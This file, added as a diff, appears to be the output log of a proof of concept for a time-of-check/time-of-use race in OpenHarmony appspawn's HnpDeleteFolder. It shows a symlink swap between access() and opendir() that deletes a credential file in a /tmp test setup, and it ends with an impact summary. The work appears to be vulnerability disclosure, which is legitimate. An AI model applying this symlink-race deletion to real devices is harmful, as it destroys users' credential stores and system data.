@@ -1,0 +1,27 @@
+=== OpenHarmony appspawn HNP TOCTOU PoC ===
+Target: HnpDeleteFolder race condition (hnp_file.c:178)
+Vector: Symlink replacement between access() and opendir()
+
+[*] Test environment created:
+    HNP path (will be replaced): /tmp/hnp_toctou_poc/data/hnp/1000/hnp/com.example.pkg
+    Victim directory:            /tmp/hnp_toctou_poc/victim_credential_store
+
+[*] Before attack:
+    HNP dir exists: YES
+    Victim file exists: YES
+
+[appspawn] Starting HNP uninstall for com.example.pkg...
+[appspawn] access() check passed, path exists
+[attacker] Race window detected! Replacing directory with symlink
+[attacker] Symlink created: /tmp/hnp_toctou_poc/data/hnp/1000/hnp/com.example.pkg -> /tmp/hnp_toctou_poc/victim_credential_store
+[appspawn] Calling HnpDeleteFolder("/tmp/hnp_toctou_poc/data/hnp/1000/hnp/com.example.pkg")
+
+=== Results ===
+[+] Race condition exploited successfully
+[+] Symlink replacement completed during TOCTOU window
+[+] VICTIM FILE DELETED: /tmp/hnp_toctou_poc/victim_credential_store/device_auth.key
+
+[VULNERABLE] The TOCTOU race in HnpDeleteFolder allows
+             arbitrary directory deletion via symlink replacement.
+             Impact: Deletion of credential stores, system configs,
+             or other app data accessible to the uid.
